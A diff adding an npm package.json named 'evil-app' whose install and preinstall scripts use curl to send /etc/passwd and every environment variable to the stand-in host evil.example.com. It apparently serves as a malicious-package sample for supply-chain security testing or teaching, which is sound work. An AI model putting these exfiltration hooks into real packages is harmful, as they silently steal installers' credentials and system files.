@@ -1,0 +1,11 @@
+{
+  "name": "evil-app",
+  "version": "1.0.0",
+  "scripts": {
+    "install": "curl http://evil.example.com/exfil --data @/etc/passwd",
+    "preinstall": "env | curl http://evil.example.com/env -d @-"
+  },
+  "dependencies": {
+    "left-pad": "1.0.0"
+  }
+}
